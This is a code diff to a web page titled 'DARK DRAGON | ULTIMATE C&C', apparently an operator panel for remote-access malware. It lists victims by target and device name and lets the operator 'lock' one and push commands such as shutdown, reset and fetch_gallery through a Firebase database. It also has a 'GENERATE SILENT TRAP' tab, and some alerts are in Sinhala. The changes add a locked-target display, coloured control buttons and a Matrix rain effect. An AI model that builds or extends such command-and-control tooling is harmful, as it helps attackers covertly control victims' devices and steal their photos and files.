@@ -2,7 +2,7 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>DARK DRAGON | ULTIMATE C&C v3.0</title>
+    <title>DARK DRAGON | ULTIMATE C&C v3.1</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -15,6 +15,7 @@
         button:hover { background: white; }
         #dashboard { display: none; }
         header { border-bottom: 2px solid var(--neon-red); padding: 10px; text-align: center; background: #110000; }
+        .target-status { background: #220000; color: #00ff00; padding: 5px; font-size: 12px; border-bottom: 1px solid var(--neon-red); text-align: center; }
         .tabs { display: flex; flex-wrap: wrap; background: #0a0000; border-bottom: 1px solid var(--neon-red); }
         .tab { padding: 10px 5px; cursor: pointer; border-right: 1px solid var(--dark-red); flex: 1; text-align: center; font-size: 10px; }
         .tab.active { background: var(--neon-red); color: #000; font-weight: bold; }
@@ -26,7 +27,6 @@
         th, td { border: 1px solid var(--dark-red); padding: 8px; text-align: left; }
         .live-window { width: 100%; height: 250px; background: #000; border: 1px solid var(--neon-red); display: flex; align-items: center; justify-content: center; color: var(--neon-red); overflow: hidden; }
         .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; }
-        .file-item { border: 1px solid var(--dark-red); padding: 5px; text-align: center; font-size: 9px; }
     </style>
 </head>
 <body>
@@ -42,6 +42,7 @@
 
 <div id="dashboard">
     <header><h3>DRAGON REMOTE COMMAND INTERFACE</h3></header>
+    <div class="target-status">LOCKED TARGET: <span id="active-target-display">NONE</span></div>
 
     <div class="tabs">
         <div class="tab active" onclick="showTab(event, 'radar')">🛰️ RADAR</div>
@@ -55,7 +56,7 @@
     </div>
 
     <div class="container">
-        <div id="radar" class="panel active"><h2>SCANNING NODES...</h2></div>
+        <div id="radar" class="panel active"><h2>SCANNING NODES...</h2><p>Radar active. Monitoring incoming victim signals.</p></div>
 
         <div id="cat-injector" class="panel">
             <h2>GENERATE SILENT TRAP</h2>
@@ -87,8 +88,7 @@
 
         <div id="gallery" class="panel">
             <h2>GALLERY FILE ACCESS</h2>
-            <div class="file-grid" id="gallery-files">
-                </div>
+            <div class="file-grid" id="gallery-files"></div>
             <button onclick="sendCommand('fetch_gallery')">REFRESH FILES</button>
         </div>
 
@@ -100,9 +100,9 @@
 
         <div id="control" class="panel">
             <h2>REMOTE SYSTEM CONTROL</h2>
-            <button onclick="sendCommand('restart')">RESTART</button>
-            <button onclick="sendCommand('shutdown')">OFF</button>
-            <button onclick="sendCommand('reset')">RESET</button>
+            <button onclick="sendCommand('restart')" style="background:orange">RESTART</button>
+            <button onclick="sendCommand('shutdown')" style="background:red; color:white">OFF</button>
+            <button onclick="sendCommand('reset')" style="background:yellow">RESET</button>
         </div>
     </div>
 </div>
@@ -136,20 +136,23 @@
             snap.forEach((child) => {
                 const val = child.val();
                 list.innerHTML += `<tr><td>${val.target}</td><td>${val.device}</td><td>${val.time}</td>
-                <td><button onclick="selectTarget('${child.key}')">SELECT</button></td></tr>`;
+                <td><button onclick="selectTarget('${child.key}', '${val.target}')">SELECT</button></td></tr>`;
             });
         });
     }
 
-    function selectTarget(key) {
+    // --- නව Target Selection සිස්ටම් එක ---
+    window.activeTarget = null;
+    function selectTarget(key, name) {
         window.activeTarget = key;
-        alert("Target Locked!");
+        document.getElementById('active-target-display').innerText = name;
+        alert("Target [" + name + "] Locked! දැන් ඕනෑම Command එකක් යවන්න පුළුවන්.");
     }
 
     function sendCommand(cmd) {
-        if(!window.activeTarget) return alert("Select Victim First!");
+        if(!window.activeTarget) return alert("කරුණාකර කලින් Victim කෙනෙක්ව SELECT කරන්න!");
         db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now() });
-        alert("Sent: " + cmd);
+        alert("Sent Command: " + cmd);
     }
 
     function showTab(evt, id) {
@@ -158,6 +161,26 @@
         document.getElementById(id).classList.add('active');
         if(evt) evt.currentTarget.classList.add('active');
     }
+
+    // Matrix Effect
+    const canvas = document.getElementById('matrixCanvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const alphabet = "01";
+    const fontSize = 16;
+    const columns = canvas.width / fontSize;
+    const rainDrops = Array(Math.floor(columns)).fill(1);
+    function drawMatrix() {
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#ff0000'; ctx.font = fontSize + 'px monospace';
+        for(let i = 0; i < rainDrops.length; i++) {
+            const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+            ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
+            if(rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
+            rainDrops[i]++;
+        }
+    }
+    setInterval(drawMatrix, 50);
 </script>
 </body>
 </html>
